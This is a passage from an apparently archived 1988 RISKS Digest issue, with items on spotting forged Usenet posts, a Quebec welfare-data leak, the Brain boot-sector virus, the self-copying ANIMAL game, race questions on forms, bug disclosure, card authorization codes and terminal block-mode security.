        o Funky Message-ID. Subtle hints are often lodged into the
          Message-Id, as that field is more or less an unparsed text string
          and can contain random information. Common values include pi,
          the phone number of the red phone in the white house, and the
          name of the forger's parrot.

        o subtle mispellings. Look for subtle misspellings of the host names
          in the Path: field when a message is forged in the name of a Big
          Name USENET person. This is done so that the person being forged
          actually gets a chance to see the message and wonder when he
          actually posted it.

Forged messages, of course, are not to be condoned. But they happen, and
it's important for people on the net not to over-react. They happen at this
time every year, and the forger generally gets [his/her] kick from watching the
novice users take the posting seriously and try to flame their tails off. If
we can keep a level head and not react to these postings, they'll taper off
rather quickly and we can return to the normal state of affairs: chaos.

Thanks for your support.                                     Gene Spafford

           [Especially if the forger is into forging Trojan horseshoes.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">Private Access to Government Information --</A></H3>
<ADDRESS>
Glen Matthews 
&lt;<A HREF="mailto:GLEN%MCGILL3.BITNET@CORNELLC.CCS.CORNELL.EDU">
GLEN%MCGILL3.BITNET@CORNELLC.CCS.CORNELL.EDU</A>&gt;
</ADDRESS>
<I>Thu, 31 Mar 88 10:40:15 EST</I><PRE>
              Quebec Probing Information Leak 

The following is from a newpaper article today in Montreal. It is reproduced
here without permission. It is an example of the possible abuses when
government files are accessed, and illustrates why system designers should
take pains to make illict access as difficult as possible.

    Quebec Probing Information Leak - by Peggy Curran and Nancy Wood
    Montreal Gazette, Thursday, March 31, 1988

   Justice Minister Herbert Marx yseterday ordered a police investigation
into the sale of confidential information on welfare recipients by a South
Shore (of the St. Lawerence River) firm. And two other government probes
were launched in light of a Gazette story which outlined the activities of
Groupe Elite of Boucherville.
   Tuesday, company official Serge Peloquin denied previous claims the
company had access to government files on welfare recipients.
   However, an investigation conducted for the Gazette showed the firm was
able to come up with personal  information on a welfare recipient in less
than 4 hours.
   Yesterday, the Gazette learned that the Boucherville firm may also have
access to personal files on people on unemployment insurance.
   In the National Assembly yesterday, Manpower Minister Pierre Paradis
promised a thorough inquiry within his department. "We believe the welfare
recipient's right to confidentiality is an unalienable right and we intend
to take the measures necessary to see it is protected", Paradis said.
   Communications Minister Richard French said the Access to Information
Commission, which protects the privacy of personal documents, will conduct
its own investigation.
   "We expect to know shortly whether we're dealing with a technological
problem - that is to say, whether we're not protecting adequately the data
in the computer - or whether we're dealing with an employee who isn't
respecting the ethics appropriate to his position, or whether there's some
other kind of situation", French said.
   In a letter dated March 7, the company promised potential customers
the current mailing address of any person on welfare for a $10 fee. The firm
claimed to get its data "directly from the ministry".
   On Tuesday, Peloquin dismissed the offer sent to collection agencies as
"a kind of false advertising", designed to attract business. He said all of
his information is available from computers at the Montreal courthouse.
Minutes earlier, he'd given a private detective hired by the Gazette a
welfare recipient's home address, parents' names and unlisted telephone
number, and the fact that he receives a disability pension.
   Couthouse computers carry only the names of those who have been involved
in a civil or criminal action. Even then, listings do not include telephone
numbers, relatives' names, or welfare classifications.

[... the story goes on to recount the experience of an unidentified "victim"
who was tracked down by a finance company. He said that his address and
unlisted phone number were known to only a handful of relatives and the
Unemployment Insurance Commission ...]

   Raymonde Bellerive, a public affairs officer for Employment and
Immigration Canada, said UIC has not received a formal complaint and there
are strict guidelines on the use of confidential data. But Bellerive said
the charges are worrisome and UIC will certainly investigate if the man
complains. (UIC is the Unemployment Insurance Commission.)
   Michel Patenaude, an investigator for the Access to Information
Commission, said it's certainly not the first time confidential information
has leaked from a governmental or para-public agency. Leaks are apt to happen
whenever you have confidential information - and large numbers of employees
with access to it. But Patenaude said the case does raise the question of
of the way Social Insurance Numbers are widely used.
   "With computers, the Social Insurance Number has become the key that
opens the door to all kinds of information. Once you've got it, it's not
that difficult to find someone who'll plug it into the system."

... the story goes on to report the reaction of groups such as the Coalition
of Welfare Recipients (churchs, food banks, etc.), and the Ligue des
Propprietaires (landlords association) ...

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
New virus reported
</A>
</H3>
<ADDRESS>
forags@violet.Berkeley.EDU 
&lt;<A HREF="mailto:Al Stangenberger">
Al Stangenberger
</A>&gt;
</ADDRESS>
<I>
Thu, 31 Mar 88 09:06:32 PST
</I><PRE>

Article 16275 of comp.sys.ibm.pc:
From: dave@sun.soe.clarkson.edu (Dave Goldblatt)
Newsgroups: comp.sys.ibm.pc,comp.sys.zenith.z100,comp.misc
Subject: New Virus found..
Date: 31 Mar 88 14:26:22 GMT
Reply-To: dave@sun.soe.clarkson.edu (Dave Goldblatt)
Organization: Clarkson University, Potsdam, NY

I just pulled this from my bulletin board...

 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

FROM: Wes Brzozowski

SUBJECT: New Trojan Virus

There's a new virus program that's been seen on the West Coast, that's a 
lot nastier than the COMMAND.COM virus. This one doesn't need COMMAND.COM 
to carry it. It inserts itself into the boot record of diskettes, and 
takes 3 unused clusters, which it then marks as "bad" in the FAT. As 
such, it doesn't show up in any DOS file. Booting up from such an 
infected diskette will cause all subsequent diskettes to be infected. The 
original program that carries the thing is no longer needed, and in fact, 
no one seems to know what the original program is, so it could be here. 
I've been given a deactivated copy of the virus for study, so I know that 
this piece of trash really exists. It appears to only go for diskettes 
(only infects the A &amp; B drives), not hard drives. I haven't gotten far 
enough to find out what nastiness it will eventually do. It seems that it 
will change the volume labels of the diskettes to "(c) Brain". The boot 
record contains a message to beware of this virus, and gives an address 
(in Pakistan, no less!!) to write to for protection. This seems like a 
joke, but there's always an outside chance that someone is trying to do 
some extortion. An infected diskette will show three bad clusters if you 
run a CHKDSK on it. (So says the person who made the virus available; I 
have no intention of actually activating it to check this out.)
In any case, if you happen to see this weird volume label, or start 
seeing bad clusters in your diskettes, or (most likely) both, let us all 
know about it. We may be able to find the source of this virus, which 
would be a great service to everyone. By the way, this virus looks for 
two "innoculation bytes" in two normally unused bytes in the boot record. 
It presently looks like setting these to the proper value will make the 
virus ignore your diskettes. I'll give more details on these after I've 
gone completely through the code and am absolutely sure I know what I'm 
talking about. Until then, please keep your eyes open. Take care.
                                                    Wes B.

 * Origin: * N I T E W I N G * 607_687_3470 * Owego,NY * (Opus 1:260/410)
SEEN-BY: 260/10 313 314 320 322 325 330 335 345 350 360 410

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Virus precursor:  "ANIMAL".
</A>
</H3>
<ADDRESS>
Mike Van Pelt
&lt;<A HREF="mailto:unisv!vanpelt@unix.SRI.COM ">
unisv!vanpelt@unix.SRI.COM 
</A>&gt;
</ADDRESS>
<I>
29 Mar 88 16:23:54 PST (Tue)
</I><PRE>

  'Way back when on the Univac 1108 there was a program which had some of
the characteristics of today's viruses, though it wasn't a virus by the
strict definition.  For one thing, it was perfectly harmless except for
the waste of disk space and programmer time it caused.
   "ANIMAL" is a popular game program which (minus the 'virus') has been
written an rewritten for all kinds of machines.  It's your basic "20
questions, guess the animal" game that remembers every animal it fails to
guess.  However, while the user was playing the game, "Pervading ANIMAL"
was copying itself into every program file (very roughly equivalent to a
direcory in Unix) that the user had assigned to his session write enabled.
    It was fairly intelligent about this -- it checked to make see if a
copy of ANIMAL existed in the file, and if it did, checked to see which
version was the most current.  It even went so far as to put an illegal
time in the creation date of the copy, and used that to determine if the
ANIMAL program it was about to overwrite was created by ANIMAL.  It would
thus avoid destroying any other program which just happened to have been
named "ANIMAL".  
   To avoid possible undesirable legal entanglements, (I don't THINK he'd
mind, but I don't want to take any chances) I won't name the author,
though he is a VERY big name in the PC world these days.  His stated
objective was to recieve a copy of ANIMAL on a Univac system release tape.
(Of course, if he recieved it, so would everyone else in the whole
world.)  Rumor has it that an operating system release was pulled at the
last minute when someone noticed ANIMAL in the system library.
   The 'virus' action of the program was in a rather elegant little
subroutine called "PERVADE", which had some really classic documentation:

      "Pervasive Release: A new means of distributing software:
      ... When someone calls you and asks you for a copy of your
      program, you can tell them that in all probability they
      already have it, much to their own surprise."  
      (Hey, maybe the GNU people would like this... :-)

   There were a number of copies of ANIMAL that had been "fixed" so that
they didn't pervade.  Of course, in classic Darwinian fashion these were
vastly outnumbered by the ones with intact reproductive powers.  Then 
with release 33 of Exec 8 the format of file item table was changed, and
ANIMAL pervaded no more, though it still played a good game of "ANIMAL".
Rumor has it that somewhere someone updated the PERVADE subroutine to
recognize the new file item format, but I haven't heard more about it
in several years.  Game playing on mainframes is a dying pastime, anyway.
(We're all too busy reading NetNews :-)

Mike Van Pelt        Unisys, Silicon Valley       vanpelt%unisv@ubvax.ub.com
Bring back UNIVAC!                              ...uunet!ubvax!unisv!vanpelt

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
More On Race and Ethnicity Questions...
</A>
</H3>
<ADDRESS>
&lt;<A HREF="mailto:mpabrin@nswc-g.ARPA">
mpabrin@nswc-g.ARPA
</A>&gt;
</ADDRESS>
<I>
Tue, 29 Mar 88 21:16:52 est
</I><PRE>

Les Earnest (and Peter Neumann):

First, thank you for what is *really* one of the best (longest, and most
enjoyable) RISKS items I've read.  If you *really, really* think about it,
there is no way to justify a RACE or ETHNICITY question, unless you accept the
notions of quotas, percentages, much et cetera, in lieu of selecting the best
qualified candidate for a position.

For several years, on various forms [I've lived in Virginia for 15 years] I've
answered RACE: HUMAN (but I must confess, intermittently).  Strangely, the
answer has *never* been questioned, or at least, I've not been questioned about
it.

Before I entered the Federal Civil Service [Summer, 1963] I completed the
standard background questionnaire.  To the question about membership in
organizations (by its placement, obviously derivative of the McCarthy-era
mentality) I answered ARBEITER SAENGER JUGENDCHOR, loosely the [German]
Workingmen's Singing Youth Chorus.  It was based at the Labor Lyceum, a hotbed
of Socialist activity in the Thirties, and pro-German sentiment in the Forties.
My singing career was [very] short.  It [began and] ended in the mid-Fifties,
but for its brief duration, I was in closely harmonious contact with many, many
holdovers from the earlier eras.  Until today I never realized *why* my
background checks were *always* among the first ones completed.

Lately it is fashionable [some slug might say mandatory] in working for that
same employer to be an EEO [Equal Employment Opportunity] champion.  Years ago
I was invited to join an Officers' Club.  The application clearly stated that
membership was restricted to Commissioned Officers and Civil Servants at and
above a particular grade-level.  I did not join, and in my declination letter
[with copy to the C.O., *always* the local EEO officer] I wrote, "...I TAKE
OFFENSE AT AN INVITATION TO JOIN AN ORGANIZATION WHICH DISCRIMINATES IN ANY
WAY, ...AND DISCRIMINATION BY RANK OR PAY GRADE IS DISCRIMINATION JUST AS
SURELY AS DISCRIMINATION BY COLOR, AGE, ETHNICITY, GENDER OR RELIGION."  I
received [his] written reply which cited four references for the maintenance of
"status quo", and repeated the invitation to join.  I don't think he got my
meaning, and I'm sure he *knows* I didn't get his.

More recently, after receiving literally tens of pages of flyers and electronic
mail messages of invitation to [month of February] racially and ethnically
identifiable celebrations - NO ANNUAL LEAVE REQUIRED - I invited my immediate
manager to the "Left-Handed Second Son of the Left-Handed Second Son of the
Immigrant Lithuanian Cloth Cutter Quarter-Hour of Silence" (to be held sometime
between 12:00 and 14:00 on Monday, 30-May-88).  She seemed to avoid me for a
week.  When I explained that it would involve hamburgers, hot dogs, beer and a
swimming pool, she began to understand.

What has any of my establishment-bashing (or Les Earnest's, - Come on! Are you
*really*?) got to do with RISKS [of Computers and other Technology In Society]?
Just this.  We manufacture and implement and profit by the use of tools in our
society.  We also think (and choose and love and eventually die - every one of
us, I trust).  If one continuously chooses the *safe* [non-risky] path in one's
society [including *safe* answers to obviously obnoxious, albeit entrenched,
questions on forms of many organizations within the greater society], neither
the person nor the society grows.  Get out there and challenge the bigots! Both
you and the society will grow.  Oh, but do it reasonably.  Finally, the
tie-in...  The same habit of questioning, analysis, refusal to accept [a
less-than-good] existing tehnology, and suggestion of a better way, is usually
rewarded by a fair-minded manager [both within and without the Government].
I've often wondered *why* the same person who will not accept or tolerate
shoddy work or thinking on the job, will choose to ignore or tolerate or accept
or embrace any shoddy societal norm.

  Mike Pabrinkis         (K33)              mpabrin@nswc-g.arpa
  Naval Surface Warfare Center                 (703)663-7529
  Dahlgren, VA           22448                  (AV)249-7529

  DISCLAIMER: Yes, the opinions are *only* mine.  You are invited to
  ignore, tolerate, accept or embrace [or even rebut].

  and POSTSCRIPTS: If you'd like to know more details about the 30-May-88
  "...Quarter-Hour", contact me directly [less-RISKy].

  A tender apology for punning Les's name.  He *really* is Les Earnest.

  Now, go back and *analytically* re-read the subject-line.  Thank you.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Short stories of old computer risks (Les Earnest)
</A>
</H3>
<ADDRESS>
&lt;<A HREF="mailto:ephraim@Think.COM">
ephraim@Think.COM
</A>&gt;
</ADDRESS>
<I>
Thu, 31 Mar 88 14:46:34 EST
</I><PRE>

In RISKS 6:50 Les Earnest writes of his trials and amusement with a
system that tried to classify him:
  &gt; The incidents described span a period of twenty years ending 25
  &gt; years ago, but I think they are still amusingly relevant.  

His recollections of institutional racism reminded me of an anecdote
from my father, and that in turn suggested a forward-looking moral to
both stories.  First, the story:

In about 1955, my father was stopped for running a stop sign.  (He
didn't see it, honestly.)  The policeman asked my father for various
information, including his nationality.  "I'm American." he replied
with a thick accent.  The officer was unconvinced.

"But where are you *from*?"
"Well, I was born in Berlin."
"German, then."
"I was never a German citizen.  I was Latvian.  But now I'm American."
"Latvia?  Where's that?"
"It's not there anymore.  It's part of the Soviet Union."
"So you're Russian."
"No, my father was Russian, not me.  My mother was Latvian.  We're all
 American now."

The officer called the station for instructions.  He had a lively
discussion with the desk sergeant, during which my father overheard
him exclaim that, "You're not American unless you're six ways a
bastard!"  Eventually they concluded that, given the presence of a
valid Connecticut driver's license, nationality wasn't really that
important on a traffic ticket.

Second, the moral:

It's difficult now to imagine the social climate of the 1950's in
which these incidents occurred.  It's sometimes claimed that some
system, power, or technology won't be abused because society - social
pressure, morals, or current law - prevent it.  But next year things
will be different, and in thirty years the social climate of today
will be almost impossible to recall.  That's why it's important, in
forums such as this Risks Digest, to consider the conceivable risks
and not only the present ones.

Ephraim Vishniac					  ephraim@think.com
Thinking Machines Corporation / 245 First Street / Cambridge, MA 02142-1214

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Notifying users of security problems
</A>
</H3>
<ADDRESS>
&lt;<A HREF="mailto:"hugh_davies.WGC1RX"@Xerox.COM">
"hugh_davies.WGC1RX"@Xerox.COM
</A>&gt;
</ADDRESS>
<I>
31 Mar 88 01:25:29 PST (Thursday)
</I><PRE>

In RISKS 6.50, Andy Goldstein (goldstein%star.DEC@decwrl.dec.com) states..

"Sending out notice of the presence of a bug without a correction or
workaround is of course even more irresponsible."

When I first saw this I couldn't believe what I was reading. Well, I've reread
it several times, and it still says the same thing. I only hope that Andy was
joking, or that I have grasped the meaning wrongly, because what I think that
it means is that I can get bitten by a bug that someone knows about, but
hasn't told me because he doesn't have a fix or workaround.

Surely, just knowing about a bug is enough to help avoid it causing problems?
If I know that doing a particular operation causes problems, I will avoid
doing that operation, and that is a workaround in itself.

Also, knowing that a bug exists in a particular area will save me manhours, and
therefore money, investigating a problem which is already known.

Please, Andy, tell me I've got it wrong!

Hugh Davies.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Credit-limit handling found overly restrictive (<A HREF="/Risks/6.50.html">RISKS-6.50</A>)
</A>
</H3>
<ADDRESS>
Henry Mensch
&lt;<A HREF="mailto:henry@GARP.MIT.EDU ">
henry@GARP.MIT.EDU 
</A>&gt;
</ADDRESS>
<I>
Wed, 30 Mar 88 22:44:09 EST
</I><PRE>

   Date: Tue, 29 Mar 88 13:48 PST
   From: Wm Brown III &lt;Brown@GODZILLA.SCH.Symbolics.COM&gt;

   Look at the number of characters in an authorization code; it is far
   too small to reflect the number of authorizations issued ...

When I worked at Chase Manhattan in New York authorization codes (for
check encashment, not credit card authorization, but I suspect they
work in similar ways) were a function of the dollar amount of the
item, the day of the week and the date.  Other institutions may have
other (perhaps proprietary) ways to compute an authorization code.
The functions used probably have no relation to the number of
transactions authorized in a single business day.

# Henry Mensch / &lt;henry@garp.mit.edu&gt; / E40-379 MIT, Cambridge, MA
#      {ames,cca,rochester,harvard,mit-eddie}!garp!henry

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Bankcard authorizations
</A>
</H3>
<ADDRESS>
&lt;<A HREF="mailto:FMCKAY%HAMPVMS.BITNET@MITVMA.MIT.EDU">
FMCKAY%HAMPVMS.BITNET@MITVMA.MIT.EDU
</A>&gt;
</ADDRESS>
<I>
Thu, 31 Mar 88 18:38 EST
</I><PRE>

Many years ago I was asked to set up a system to monitor phone traffic for a
regional authorization center in Florida.  I was told by someone there that
the authorization code was a checksum on such things as card number, merchant
number, and AMOUNT.  It seems to me that if this is the case, an authorization
for an estimated amount would make the code formula tilt if the charge was
later challenged.

I currently accept MC/Visa in my business and once received an authorization
for a charge that the bank returned as invalid.  Since the card number was
read to me over the phone, I assume something got garbled in the process.
However, how did the authorization go through?

I would be curious to hear of similar experiences but I make no representation
as to the accuracy of the formula information considering the age and source.

Fred McKay ----   FMCKAY@HAMPVMS.BITNET

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Terminals and checking the facts
</A>
</H3>
<ADDRESS>
LEICHTER-JERRY@CS.YALE.EDU
&lt;<A HREF="mailto:"Jerry Leichter ">
"Jerry Leichter 
</A>&gt;
</ADDRESS>
<I>
Thu, 31 Mar 88 13:46 EST
</I><PRE>

In RISKS 6.51, A.E. Mossberg takes me to task for not considering the security
of block mode in VT220's, and proceeds to outline a way to use block mode to
cause a VT220 to send an arbitrary set of commands back to the host.

The problem with the scenario is that it has nothing to do with reality.
Neither the VT220, nor any of the VT200 series, has any block mode instruc-
tions!  Mr. Mossberg claims to have "looked in the VT220 manuals" to construct
his scenario; clearly he didn't look very closely.

Ignoring ancient history like the VT62 and speciality products, the only DEC
terminals with block mode are VT131 and VT132 (both now two to two and a half
generations old and obsolete; I won't discuss them further) and the VT330 and
VT340.  (The VT320 MIGHT have block mode; I doubt it but don't have a manual
to check.)

There are two ways to configure block mode on a VT3xx.  Normally, sending from
the screen is initiated from the keyboard by the user hitting the Enter key.
This mode provides no direct opportunity for a host to read back stuff from
the screen "on its own", though of course it is not risk-free - the user may
be too trusting and hit Enter when there is stuff on the screen that he didn't
put there and doesn't want sent!  The other mode is also nominally controlled
from the terminal:  When the user hits Enter, the terminal sends a "request to
send screen" message; the host responds with a "send screen now" message.  The
manual doesn't say whether a "send screen now" message received when the ter-
minal hasn't sent a "request" will be honored.  If it is, there's a potential
hole; if it isn't - certainly an option that's easy to implement - the user
remains in control.

All that said, having block mode is INHERENTLY somewhat riskier than not
having it, though the risk can be made quite small by proper design.*  This
fact was recognized by the designers of the VT3xx:  There is a SETUP option
that disables block mode completely.  The host can then send "Enter block
mode" sequences as much as it likes, with no effect.

							-- Jerry

* The way to make a truely secure block mode terminal is to realize that the
source of the problem is the ability of a malicious program to cause input
indistinguishable from user typein to get sent down the line.  If block mode
transmissions were always wrapped in a recognizable sequence - for example,
if they were always within a distinctive DCS - the host could filter out
block transmissions received in places where none were expected.  Of course,
ALL software on the system that could be vulnerable to such replayed data
would have to filter it.  Fortunately, if you look at the way user interfaces
work, you'll see that typically making the shell-equivalent "careful" is
enough.

Why isn't this done?  Mainly, I suppose, because block-mode terminals are
intended for use with applications that completely control the terminal with
trusted software.  Programmers don't use block-mode terminals; data entry
people do.  So the issue isn't of such great import.  The VT3xx, which is
intended to serve multiple markets, takes just the right approach:  Block mode
is there if you want it, and you can disable it otherwise.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.51.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.53.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
